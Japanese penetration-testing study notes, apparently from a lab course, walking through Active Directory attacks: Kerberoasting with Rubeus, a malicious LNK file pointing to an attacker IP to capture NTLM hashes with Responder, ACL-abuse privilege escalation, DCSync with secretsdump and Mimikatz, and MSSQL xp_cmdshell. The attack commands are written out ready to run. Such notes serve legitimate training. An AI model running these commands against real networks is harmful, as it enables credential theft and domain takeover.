csvに保存する
```powershell-session
PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

Hash のカラムが、Hashcat などにそのまま流し込める形式の TGS ハッシュになっている
```powershell-session
PS C:\htb> cat .\ilfreight_tgs.csv
```

### Rubeus
- Kerberoasting をさらにスピーディかつ柔軟に行いたい場合、GhostPack の [Rubeus](https://github.com/GhostPack/Rubeus) を使うのがおすすめ
- Rubeus は Kerberos 関連の攻撃に特化したツールで色々なことができる

Rubeus で可能な Kerberoasting オプション例
- Kerberoasting の実行と、ハッシュのファイル出力
- 別ユーザーの認証情報を使って実行（runas 的な使い方）
- Kerberoasting を Pass-the-Ticket 攻撃と組み合わせて使用
- AES が有効なアカウントを除外して実行（検出回避のための「OPSEC Kerberoasting」）
- パスワードが特定の期間内に変更されたアカウントに対してのみチケットを要求
- チケット要求の件数に上限を設定
- AES 暗号化を使った Kerberoasting の実行

**Kerberoasting 可能なアカウントの探索**
- 同じ権限のアカウントでも、作られたのが古いアカウントの方が、セキュリティ未成熟の時に作ったので、パスワードが弱い可能性がある
```powershell-session
PS C:\htb> .\Rubeus.exe kerberoast /stats
```

**管理者権限を持つユーザーに絞ってチケットを取得**
- `/nowrap` はとても重要で、出力される base64 のチケットデータがカラムで折り返されずに1行で表示されるようになる
	- これにより、Hashcat にそのまま渡せる形式でハッシュを取得可能になり、後処理も不要になる
- `admincount=1` : admincount 属性が 1 のユーザー（管理者権限を持つ可能性が高い）に限っている
- RC4暗号化の方が、AES暗号化よりもクラックしやすいので、RC4ハッシュの方を取得する
- Rubeus の `/tgtdeleg` フラグを使うことで、**サービスチケットのリクエスト時に RC4 暗号のみを使用するよう指定**できる。
	- このフラグを指定すると、TGSリクエストのボディ内で「RC4 だけをサポートする」と明示的に宣言する形になる
```powershell-session
PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

# LNK File Attack
- 水飲み場攻撃の一種
- 権限を昇格させたり、管理者のハッシュを取得したい場合など
	- 管理者など高権限ユーザーの NTLMハッシュを取得
	- SMBリレーやパスワードクラックなどに繋げる
- 特に共有フォルダ（社内ファイル共有）が攻撃経路になる

攻撃の流れ（3ステップ）

1. 悪意ある .lnk（ショートカット）ファイルを作る
	- .lnk ファイルは、アイコンやリンク先などに**リソース参照先、UNCパス**を指定できる
	- 例： `\\ATTACKER_IP\icon.ico`
	- Windowsはアイコン表示のためにこのリモートパスに勝手にアクセスする！

.Inkファイルの作成コマンド
- この時に、作成する.lnkファイル名の接頭辞に「@」か「~」をつける
	- こうすることで、エクスプローラーで表示した時に、上の方に出てきて、windowsに勝手に実行されやすくなる
```powershell
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("<ADの共有フォルダ>\@test.lnk")
$lnk.TargetPath = "\\<攻撃者のIP>\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```

2. その .lnk ファイルを共有フォルダに置く
	- 社内共有フォルダやホームドライブなど、誰かが開く可能性のある場所に配置
	- 例えば：`\\fileserver\public\Project2025Shortcut.lnk`

3. KaliでResponderを立ち上げ、接続を待つ
```sh
sudo responder -I eth0 -dPv
```

4. 管理者が .lnk ファイルを表示 or アクセスした瞬間、NTLMハッシュが送信される
	- 被害者のマシンは `\\ATTACKER_IP\icon.ico` に自動アクセス
	- 攻撃者側（例：Kali Linux）で Responder を起動していれば、
→ SMB認証を試みるNTLMv2ハッシュがキャプチャできる

つまりこういうこと
- ファイルを開かなくても、エクスプローラーで一覧表示しただけでアウト！
- .lnk のアイコンロード時点で SMB通信が発生 → NTLMハッシュが飛ぶ
- それをResponderやInveighでキャプチャして使う

.lnkファイルの自動作成ツール
- 以下のコマンドで、.inkファイルを作成して、公開共有ホストにおいてくれる。攻撃者がやるのはResponderで待機することだけになる
```sh
netexec smb <AD参加ホスト> -d <ドメイン名> -u <ユーザー名> -p <パスワード> -M slinky -M slinky -o NAME=test SERVER=<攻撃者IP>
```


# Access Control Listの悪用
Access Control List : アクセス制御リスト
- 「誰がどのリソースにアクセスできるのか、どの程度の権限があるのか」を定義するリスト
- Active Directory（AD）環境では、セキュリティ上の理由から、すべてのユーザーやコンピュータがすべてのオブジェクトやファイルに自由にアクセスできるわけではない
	- こうしたアクセス権限の制御に使われる
- 一見地味に見えるこの仕組みだが、ほんの少しの設定ミスで、**本来アクセス権のないユーザーに権限が漏れてしまう**ことがあり、ドメイン全体のセキュリティに深刻な影響を及ぼす可能性がある
- ACLは、ACEと呼ばれる個々のエントリの集合

## 2種類のACL
1. **DACL（Discretionary Access Control List）**
	- Discretionary : 「任意の／裁量による」という意
	- どのセキュリティプリンシパルにアクセスを許可／拒否するかを定義する
	- 具体的には、アクセス可／不可を指定するACEの集合
	- 誰かがオブジェクトへアクセスしようとした際、OSはDACLをチェックして、どのレベルのアクセスが許可されているかを判断する
2. **SACL（System Access Control List）**
	- こちらはアクセス権の設定ではなく、アクセスの試行を監査・ログ出力する目的で使われる
	- 管理者が「このオブジェクトへのアクセスをログに残したい」といったケースで利用する

ACLの実例
- Permission entries」として並んでいるのがDACLの中身で、**それぞれがACE**に該当する
	- たとえば「Full Control」や「Change Password」といった項目ごとに、誰に何の権限があるかが明示されていて、そのユーザーオブジェクトに対して他のユーザーやグループが持つ具体的な操作権限が定義されている

ADUCでの確認方法（Active Directory Users and Computers）
![](https://i.imgur.com/3ePJIKr.png)

SACL（System Access Control List）は、**「監査」(Auditing)タブ**の中で確認できる
- これは、オブジェクトに対して誰がどのようなアクセスを試みたのかをログとして記録するための設定

## ACE（Access Control Entry）
- ACLの実際の設定を行なってるエントリ
- ACLは、ACEと呼ばれる個々のエントリの集合
- 各ACEは「このユーザー/グループ/プロセス（セキュリティプリンシパル）が、このオブジェクトにこういう操作をしてよい」といった情報を持っている。
	- 1つのオブジェクトに対して複数のACEが設定されることもある
Active Directory内で設定できるACEの種類は、主に以下の3つ

|**ACEの種類**|**説明**|
|---|---|
|**Access denied ACE**|DACL内で使用され、特定のユーザーやグループに対して「アクセスを明示的に拒否」する設定。|
|**Access allowed ACE**|DACL内で使用され、「アクセスを許可」する設定。|
|**System audit ACE**|SACL内で使用され、オブジェクトへのアクセス試行をログに記録する設定（アクセスの成否や操作内容を記録）。|
ACEの構成要素
1.	SID（セキュリティ識別子）
	- アクセス対象となるユーザーまたはグループのSID（またはGUI上では名前）
2.	ACEタイプのフラグ
	- アクセス許可／拒否／監査のどれかを示すフラグ
3.	継承フラグ
	- 子オブジェクトにもこのACEを継承させるかどうかを指定する設定
4.	アクセスマスク（Access Mask）
	- オブジェクトに対して付与される権限を表す32ビットの値

ADUCでの確認方法（Active Directory Users and Computers）
![](https://i.imgur.com/KR0g3dC.png)

ACE の重要性
- 攻撃者にとってACEは非常に有効
	- ACEを利用することで、さらなるアクセス権を得たり、環境内に長期間潜伏するための足がかりになる
- ペンテスターにとってもチャンス
	- 多くの企業では、各オブジェクトに対して、どんなACEが設定されているのかを把握しきれていない。
	- 誤った設定によるリスクも見落とされがち
	- ACEは一般的な脆弱性スキャンでは検出されない
	- 特に大規模・複雑な環境では何年も放置されている可能性がある
	- 「ありがちなActive Directoryの設定ミス」や「初歩的な脆弱性」が潰されている場合でも、ACLの悪用は横方向や縦方向の移動、さらにはドメイン全体の乗っ取りを可能にする強力な手段となり得る

### 代表的なActive Directoryオブジェクトの権限と悪用例
- 以下は、BloodHoundなどのツールで可視化・列挙できる、実際に悪用可能な権限です。PowerViewなどを使って実行可能

| **権限**              | **悪用方法（PowerView例）**                  | **攻撃概要**                           |
| ------------------- | ------------------------------------- | ---------------------------------- |
| ForceChangePassword | Set-DomainUserPassword で他人のパスワードをリセット | ターゲットアカウントを乗っ取るためにパスワードを強制リセットする攻撃 |
| Add Members         | Add-DomainGroupMember でグループにユーザー追加    | 高権限グループに自分または他ユーザーを追加して権限昇格する攻撃    |
| GenericAll          | パスワードリセットやグループ操作などが可能                 | 対象オブジェクトに対する完全な制御権を得て自由に操作できる状態    |
| GenericWrite        | Set-DomainObject で任意属性の書き換え           | 属性の書き換えによりKerberoastingや委任攻撃を仕掛ける  |
| WriteOwner          | Set-DomainObjectOwner で所有者を変更         | 所有権を奪って自分に対するフルコントロールを後から付与できる     |
| WriteDACL           | Add-DomainObjectACL でACL自体を編集         | アクセス権リストを書き換えて自分や他者に権限を付与するバックドア攻撃 |
| AllExtendedRights   | パスワードリセットやグループ操作に利用可能                 | ユーザー制御系の特権操作が可能となるため、乗っ取りや昇格が可能    |
| AddSelf             | 自分を特定のグループに追加可能                       | 自身を高権限グループに追加して権限昇格する攻撃            |
主に、ACL攻撃は以下のような目的で使用できる
- **横移動（Lateral Movement）**
- **権限昇格（Privilege Escalation）**
- **永続化（Persistence）**

その他の権限が出てきた時も
- BloodHoundで表示される「エッジ（Edge）」の意味や活用法を把握しておくと、脆弱な関係性を見逃しにくくなる
- Active Directoryに存在する拡張権限も、可能な限り事前に調べておくことで、実際の診断や攻撃展開時に強力な武器となる

## ACLの列挙（ACL Enumeration）
PowerViewでのACLとBloodHoundでの可視化手法

### **PowerViewでのACL列挙(ベストプラクティス)**
- PowerViewはACLの列挙にも使える強力なツール
	- すべての出力を手作業で精査しようとすると非常に大変で、見落としや誤解釈のリスクも高まる
⇨ **「興味深い（＝悪用可能な）ACL」** を探すための出発点としては便利ですが、出力された情報を**どこまで深掘りするかがカギ**
- 大量のデータに圧倒されないよう、特定の条件や対象を絞り込んで活用していくのが現実的

ACLの一覧列挙コマンド
```powershell-session
PS C:\htb> Find-InterestingDomainAcl
```

**効率的なACLの列挙コマンド**
- 例 : **自分がすでに制御下に置いたユーザー**を起点にして、そのユーザーが持つ権限だけを重点的に調べていく方法

1：対象ユーザー(wley)のSIDを取得
- wley のSIDを取得する
```sh
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> $sid = Convert-NameToSid wley
```

2：Get-DomainObjectACLで権限を絞り込み
- SIDを元に、ドメイン内の全オブジェクトの中から「wley に権限があるオブジェクト」を抽出する
```powershell-session
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 

AceQualifier           : AccessAllowed
ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0
```
- 特定のオブジェクトだけに絞って確認することも可能
	- 例："GPO Management" に対して forend が権限を持っているかを確認する
```sh
PS C:\Tools> $sid = Convert-NameToSid forend
PS C:\Tools> Get-DomainObjectACL -Identity "GPO Management" -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}
```
#### 出力結果の見方
**SecurityIdentifier に対応するユーザー**（例：wley）が、**ObjectDN**（CN=Dana Amundsen）に対して**ObjectAceType**(User-Force-Change-Password)・**ActiveDirectoryRights**(ExtendedRight)を持っている。
- ActiveDirectoryRights : 権限の「カテゴリ」や「基本動作」
- ObjectAceType :  その中の「具体的な操作内容」

- 出力結果に ExtendedRight のような曖昧な情報が出る場合
	-  GUID形式のまま表示されてしまっているから。
	- ⇨ `-ResolveGUIDs`オプションをつけて再実行する
出力されたところの`ObjectAceType`を見る。ぱっと見わからないけど、これの値をGoogleで検索したら、権限がわかる

Get-DomainGroup によるヘルプデスク レベル 1 グループの調査
```powershell-session
PS C:\htb> Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
```
### PowerShellでGUIDで逆引きする
新しいPowerShellセッションを開いて実行する
- GUIDを変数に代入
- Active Directory内のExtended Rights情報を検索してGUIDを逆引き
```powershell-session
PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"
PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl

Name              : User-Force-Change-Password
DisplayName       : Reset Password
DistinguishedName : CN=User-Force-Change-Password,CN=Extended-Rights,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
rightsGuid        : 00299570-246d-11d0-a768-00aa006e0529
```

### PowerViewを使わないACL列挙
- クライアントの端末など制限のある環境下でも実行できるのが利点

1：ドメインユーザー一覧を取得
- ドメイン内のユーザーをリスト化してファイルに出力
```sh
PS C:\htb> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```

2：各ユーザーのACLを調べるループ処理
- foreachループでファイル内のユーザー名を1行ずつ処理
```sh
PS C:\htb> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {
    Get-Acl "AD:\$(Get-ADUser $line)" |
    Select-Object Path -ExpandProperty Access |
    Where-Object { $_.IdentityReference -match 'INLANEFREIGHT\\wley' }
}
```

まとめ
まずは「制御下に置いたユーザー」が持っているACLを特定し、どのオブジェクトに対して何ができるのかを見極める。
そこから派生して、**権限の連鎖（グループ権限の継承やネスト）を辿ることで、より高い権限へとアクセスを拡大**していく。
- ネストされたグループに注目
	- 権限を昇格・横展開先が他の高権限グループにネスト（入れ子）されていないか？
- GenericAll（完全な制御権限） を持っていたら
	- グループメンバーシップの変更
	- パスワードの強制リセット
	- Kerberoastingによるパスワードクラッキング（対象ユーザーのSPNが設定されていて、かつパスワードが弱ければ）

### BloodHoundを使ったACL列挙
- BloodHound を使えばこれらの情報を一目で視覚的に把握することができる
実行手順（概要）
	1.	SharpHoundで収集したデータをBloodHoundにアップロード
	2.	wley ユーザーをスタートノードに設定
	3.	「Node Info」タブの「Outbound Control Rights」を確認

この機能を使うことで、
- 自分が直接制御できるオブジェクト
- グループ経由で間接的に影響を及ぼせるオブジェクト
- ACLチェーンによって最終的に制御可能となるオブジェクト数
などを視覚的に把握できる

BloodHound上でエッジを右クリック → 「Help」メニューで得られる情報
- 権限の詳細情報と悪用手法
- 使用可能なツールやコマンドの例
- OPSEC（運用上の注意点）
- 外部リファレンスリンク

Transitive Object Control の「16」をクリック
  - 手動で調べたすべての攻撃パスを可視化
  - 各ステップのヘルプメニューから最適な攻撃方法を確認可能

プリセットクエリを使用（BloodHound）
  - ユーザー `adunn` が DCSync 権限を持っていることを確認
    - DS-Replication-Get-Changes
    - DS-Replication-Get-Changes-In-Filtered-Set

現時点での例の状況整理
  - `wley` → `damundsen` のパスワードを強制変更
  - `damundsen` → `Help Desk Level 1` に自分を追加（GenericWrite）
  - `Help Desk Level 1` → `Information Technology` にネスト → 高権限継承
  - `Information Technology` → `adunn` に GenericAll
  - `adunn` → DCSync 可能


# ACLを悪用した権限昇格テクニック

前提
- 「wley」ユーザーのNTLMv2ハッシュを、ペンテストの初期段階で「Responder」を使って取得済み
- 「Hashcat」でオフラインクラックすることに成功

攻撃シナリオ
1.	wleyユーザーを使って、「damundsen」ユーザーのパスワードを変更
2.	damundsenユーザーとして認証し、「GenericWrite」権限を活用して、自分がコントロールするユーザーを「Help Desk Level 1」グループに追加
3.	「Information Technology」グループ内の入れ子グループ構成を利用し、「GenericAll」権限で「adunn」ユーザーを奪取

**ステップ1：damundsenユーザーのパスワード変更**
PowerShellでwleyユーザーとして認証し、damundsenユーザーのパスワードを強制的に変更する
- プレーンテキストのパスワードをSecureStringに変換
- PSCredentialオブジェクトを作成
```Powershell
PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
```

ターゲットであるdamundsenユーザーに設定する新しいパスワードをSecureStringとして用意
- damundsenユーザーに設定する新しいパスワード
```Powershell
PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

PowerViewのSet-DomainUserPassword関数を使ってパスワードを変更
- 先ほど作成した$Credオブジェクトを-Credential引数として指定し、-Verboseをつけて実行ログを詳細に出す
```Powershell
PS C:\htb> cd C:\Tools\
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```
※ちなみに、同様の操作はLinux側からでも可能
- たとえば、pth-toolkitの一部であるpth-netを使っても対応できる

**ステップ2：damundsenとしてHelp Deskグループに追加**
- damundsenユーザーとして認証し、自分自身を「Help Desk Level 1」グループに追加する
まずは認証用のクレデンシャルを作成
```powershell-session
PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
```

現在のグループメンバーを確認
```powershell-session
PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
```

damundsenをグループに追加する処理を実行
```powershell-session
PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

追加後、ちゃんと反映されたかも確認
```powershell-session
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

**ステップ3 : Kerberoastingの準備：偽SPNの登録**
- Help Deskグループへの所属により、Information Technologyグループを通じてadunnユーザーに対する「GenericAll」権限も手に入った
- ここでは、adunnアカウントのservicePrincipalName属性を書き換え、任意のSPNを追加する
- これによってKerberoasting攻撃が可能になる

adunnアカウントのservicePrincipalName属性を書き換え、任意のSPNを追加
```powershell-session
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

- このSPNが設定されたことで、TGSチケットを取得してオフラインでハッシュをクラックすることができる
- ここではRubeusを使用して実行する
```powershell-session
PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap
```


# DCSync
前提
- INLANEFREIGHT.LOCAL ドメイン内で DCSync 権限を持つユーザー「adunn」を制御下に置いている
- adunnユーザーを使って、DCSyncを行い、ドメイン全体の権限を取得する

**DCSyncとは？その仕組み**
- DCSyncは、Active Directoryのパスワードデータベースを「ドメインコントローラーのレプリケーション機能」を悪用して盗み出す攻撃手法
- ドメインコントローラー間で情報を同期するために使われる「Directory Replication Service Remote Protocol」を利用することで、攻撃者がドメインコントローラーになりすまし、ユーザーのNTLMハッシュを取得できる
- この攻撃の核心は、「**DS-Replication-Get-Changes-All**」という拡張アクセス権限を使ってドメインコントローラーにレプリケーション(複製)を要求する点
	- この権限は、機密情報（パスワードなど）を含むレプリケーションを可能にする権限

攻撃に必要なもの
- 「**Replicating Directory Changes**」および「**Replicating Directory Changes All**」権限を持つアカウントを掌握する必要
	- ドメイン管理者やエンタープライズ管理者などはデフォルトでこの権限を保持している可能性が高い

## 実行できるかどうかの確認
**まず、攻撃に必要な権限アカウントが持っているかを確認する**
- ユーザー「adunn」のSIDや所属グループを確認できる
```powershell
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```

**Get-ObjectAclでadunnに付与されている権限を検証**
- PowerViewを用いて、adunnがドメインオブジェクト（ここでは “DC=inlanefreight,DC=local”）に対してどのようなACLを持っているかを確認する
```powershell
PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```
このコマンドの出力の中の`ObjectAceType`の部分に注目する
- `DS-Replication-Get-Changes-All`や`DS-Replication-Get-Changes-All`などのReplication関連の権限が書いてあったら、DCSync攻撃を行うことができる条件を満たしてる

また、ユーザーにDCSync権限を一時的に付与・削除することも可能
- WriteDACLなどの権限を持っていれば、任意のユーザーにレプリケーション権限を一時的に付与し、DCSync攻撃を実行した後に削除することで痕跡を隠すことも可能

## secretsdump.py
によるNTLMハッシュとKerberosキーの取得
- secretsdump.py を実行することで、NTLMハッシュやKerberosキーをファイルに保存できる
```shell
snowyowl644@htb[/htb]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
```
- 各種アカウントのリストとハッシュが含まれており、Kerberosキーや設定によっては平文パスワードも抽出される

以下のオプションも活用できる
- `-just-dc-ntlm` : NTLMハッシュのみ抽出
- `-just-dc-user <UserName>` :  特定のユーザーのみ対象
- `-pwd-last-set` : パスワード変更日時の確認
- `-history` : パスワード履歴を取得
- `-user-status` : 無効化されたユーザーを確認
出力ファイルのオプション
- `-just-dc` : 以下の3つのファイルを保存する
	- .ntds : NTLMハッシュ
	- .ntds.cleartext : 平文パスワード(リバーシブル暗号化されたアカウントの平文のパスワード)
		- **リバーシブル暗号って？**
			- 普通、Windowsの認証情報はハッシュ化されて保存されているが、平文パスワードが必要になるサービスがある場合、Windows側で「リバーシブル暗号」を有効にしておくことで、複合化できる形で、保存されている可能性がある
	- .ntds.kerberos : Kerberosキー

**リバーシブル暗号設定されたアカウントの確認**
- 通常のADアカウントでは、パスワードはハッシュ化されて保存されており、平文のパスワードを取得することはできない。
- しかし、「リバーシブル暗号（Reversible Encryption）」という設定が有効になっていると、パスワードはRC4などで復号可能な形式で保存される
- そして、ドメイン管理者やDCSyncの権限を持つユーザーであれば、Syskey（復号キー）をレジストリから取得してパスワードを復号することができる

リバーシブル暗号設定されたアカウントの列挙
```powershell
PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```
上下どっちでもいけるので、どっちかがダメだったら、もう片方も試す
```powershell
PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

## Mimikatz
- DCSync攻撃は secretsdump.py だけでなく、Mimikatz でも実行可能
- Mimikatzでは、**特定のユーザーアカウントを指定**してハッシュを取得する

注意点
- Mimikatzを使用する際には、**DCSync権限を持つユーザー（今回の例では adunn）**のコンテキストで実行する必要がある
- そのため、runas.exe を使って権限昇格したPowerShellセッションを作成する

adunnユーザーの権限を使ったPowerShellセッションを開始する
```cmd
C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell
Enter the password for INLANEFREIGHT\adunn:
Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
```
このセッション上でMimikatzを実行すれば、DCSync攻撃ができる

MimikatzでのDCSync実行

```powershell
PS C:\htb> .\mimikatz.exe
```

mimikatz内のコマンド
```powershell
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

# 環境を支配するための一手
## 特権アクセス
- Windowsドメイン内で初期アクセスを得た後の横展開の動き
	- 管理者権限がある場合
		- PtH攻撃
	- 管理者権限がない場合
		-  Remote Desktop Protocol (RDP)
			- GUIでの視覚的な操作
		- PowerShell Remoting (PSRemoting / WinRM)
			- PSでの操作
		-  MSSQL Server
			- もしSQL Serverに対して「sysadmin」権限を持つアカウントがあれば、リモートから接続してクエリを実行できる
			- SQL Serverの機能を使って、OSコマンドを実行することも可能

管理者ではないユーザーアカウントでも、RDPの権限だけは持っているケースもある
このアクセス権があるだけでも、以下のような用途で非常に有効
- そこからさらに攻撃を展開する足がかりとして使える
- 特権ユーザーの資格情報を取得するための権限昇格が狙える
- ホスト上にある機密情報や資格情報を盗み出すことができる
### RDP
RDPのアクセス権限の可視化
- BllodHoundとPowerViewの二つの方法がある
#### Blood Hound
- いくつか方法はあるけど、BloodHoundが一番視覚的に使える
	- [CanRDP](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp)：RDPで接続可能
	- CanPSRemote：PowerShell Remotingが可能
	- SQLAdmin：SQL Serverに対してsysadmin権限あり

**BloodHoundで最初にチェックすべきこと**
- BloodHoundにデータをインポートしたあと、最初に確認するポイント
- **「Domain Users」グループが、どこかのホストに対してローカル管理者権限、または実行権限（RDPやWinRMなど）を持っていないか？**
	- 仮に、LLMNR/NBT-NSスプーフィングやKerberoastingなどの攻撃を通じて**特定のユーザーを掌握できた場合**、BloodHoundでそのユーザー名を検索することで、次のような情報をチェックできる
	- そのユーザーがどのホストに対して**直接的、またはグループ経由で**実行権限（Execution Rights）を持っているか
	- 「Node Info」タブの**Execution Rights**セクションで、該当のアクセス権を視覚的に把握できる

**[Analysis]タブの活用**
BloodHoundの[Analysis]タブでは、あらかじめ用意されたクエリを使って以下のような調査が可能
- Domain UsersがRDPできるワークステーションを探す（Find Workstations where Domain Users can RDP）
- Domain UsersがRDPできるサーバーを探す（Find Servers where Domain Users can RDP）

#### PowerView
PowerViewのGet-NetLocalGroupMember関数が便利
「Remote Desktop Users」グループのメンバーを列挙するコマンド
```powershell
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb>

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Desktop Users
MemberName   : INLANEFREIGHT\Domain Users
SID          : S-1-5-21-3842939050-3880317879-2865463114-513
IsGroup      : True
IsDomain     : UNKNOWN
```
出力結果の**MemberName**をみると、このホストにはドメイン内の全ユーザー（Domain Users）がRDP接続できる状態になっている
こういった設定は、「RDS（Remote Desktop Services）ホスト」や、「踏み台サーバー」として使われているマシンでよく見られる

こういったマシンは、業務的に頻繁に使われているとメタ的な視点を持つと、以下の情報も見つかる可能性があるなとか思うのかな？
- 他システムへの侵入に使える機密情報（例：資格情報）
- ドメイン内でより高い権限を持つユーザーへの特権昇格ルート（ローカル権限昇格）
- そのままアカウント乗っ取りに繋がる認証情報の窃取

**全ホストに対して CanPSRemote ユーザーを列挙するスクリプト**
```Powershell
Import-Module .\PowerView.ps1
$computers = Get-ADComputer -Filter * | Select-Object -ExpandProperty Name
foreach ($computer in $computers) {
    Write-Host "`n[*] Checking $computer..."
    try {
        Get-NetLocalGroupMember -ComputerName $computer -GroupName "Remote Management Users"
    } catch {
        Write-Warning "Failed to query $computer"
    }
}
```

### WinRM

#### PowerView
- RDPと同様に特定のユーザーが1代以上のホストに対して、WinRMアクセス権を持っていることがあり、横方向・権限昇格を試みるとができる
- 再びPowerViewのGet-NetLocalGroupMember関数を使って、**Remote Management Users** グループのメンバーを確認できる
	- Windows 8 / Windows Server 2012以降に導入されたもので、ローカル管理者権限を与えずにWinRMアクセスを許可するために用意されている

Remote Management Users グループの列挙
```powershell
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Management Users
MemberName   : INLANEFREIGHT\forend
SID          : S-1-5-21-3842939050-3880317879-2865463114-5614
IsGroup      : False
IsDomain     : UNKNOWN
```

#### BloodHound
- カスタムCypherクエリを使用して、この種のWinRMアクセス権を持つユーザーを特定することも可能
- BloodHound画面下部の **Raw Query** ボックスで以下のクエリを実行する
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

WinRMでのセッションの確立
[[Pentest_Technique/Linux・Windows共通]]の「WinRM」参照


### SQL Server 管理者（SQL Server Admin）
- 特定のユーザーアカウントやサービスアカウントに、**SQL Serverインスタンスに対する sysadmin 権限**が与えられていることが一般的
- このようなアカウントの資格情報（クレデンシャル）の取得方法
	- Kerberoasting（よく使われる手法）
	- LLMNR/NBT-NS 応答のなりすまし
	- パスワードスプレー攻撃
	- Snaffler というツールを使って、web.config やその他の設定ファイルの中に埋め込まれたSQL Server接続文字列を探す方法

#### BloodHound
- **SQLAdminエッジ**を通じて、どのユーザーがどのホストに対してSQL管理権限を持っているかを視覚的に把握できる
- Cypherクエリを使って、SQL Adminのアクセス関係を一覧で表示することができる
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

列挙したアカウントに乗り換えることができたら、次は、MSSQLに接続する
#### PowerUpSQL
を使ったMSSQLインスタンスの列挙


- SQL Serverのインスタンス情報を一覧で取得できる
```powershell
PS C:\htb> cd .\PowerUpSQL\
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
PS C:\htb>  Get-SQLInstanceDomain
```

取得したインスタンスに対して直接認証し、カスタムクエリやOSコマンドを実行することができる
```powershell
PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

**enable_xp_cmdshell**
 `xp_cmdshell`を有効にすることで、SQL Server経由で直接**Windows OSのコマンド**を実行できるようにする
- （※アカウントに十分な権限がある場合に限る）
```Powershell
Get-SQLQuery -Verbose  -Instance "172.16.5.150,1433"  -username "inlanefreight\damundsen"  -password "SQL1234!"  -query "EXEC xp_cmdshell 'type C:\Users\damundsen\Desktop\flag.txt'"
```

#### mssqlclient.py
